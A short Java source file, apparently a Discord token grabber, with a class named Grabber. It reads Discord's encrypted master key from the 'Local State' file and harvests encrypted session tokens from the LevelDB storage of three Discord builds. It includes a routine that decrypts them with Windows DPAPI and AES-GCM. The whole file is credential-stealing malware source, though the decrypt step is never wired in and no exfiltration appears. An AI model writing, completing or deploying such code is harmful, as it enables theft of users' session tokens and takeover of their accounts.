import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;

public class Grabber {
    
    public static List<String> getTokens() {
        List<String> tokens = new ArrayList<>();
        String[] appNames = {"discord", "discordptb", "discordcanary"};

        for (String appName : appNames) {
            List<String> appTokens = getTokensForApp(appName);
            if (appTokens != null) {
                tokens.addAll(appTokens);
            }
        }
        
        return tokens;
    }

    private static List<String> getTokensForApp(String appName) {
        String key = getKeyForApp(appName);
        if (key == null) {
            return null;
        }
        
        String regex = "dQw4w9WgXcQ:";
        File[] files = new File(System.getenv("APPDATA") + "\\" + appName + "\\Local Storage\\leveldb\\").listFiles();
        List<String> tokens = new ArrayList<>();
        
        for (File file : files) {
            try {
                try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        if (line.contains(regex)) {
                            tokens.add(line.split(regex)[1].split("\"")[0]);
                        }
                    }
                }
            } catch (Exception e) {}
        }
        
        return tokens;
    }

    private static String getKeyForApp(String appName) {
        try {
            try (BufferedReader brs = new BufferedReader(new FileReader(new File(System.getenv("APPDATA") + "\\" + appName + "\\Local State")))) {
                String line;
                while ((line = brs.readLine()) != null) {
                    return new JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key");
                }
            }
        } catch (Exception e) {}
        return null;
    }

    private static String decrypt(byte[] token, byte[] key) throws Exception {
        byte[] finalKey = Crypt32Util.cryptUnprotectData(key);
        byte[] finalToken = new byte[12];
        System.arraycopy(token, 3, finalToken, 0, 12);
        byte[] data = new byte[token.length - 15];
        System.arraycopy(token, 15, data, 0, data.length);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finalToken));
        return new String(cipher.doFinal(data));
    }
}
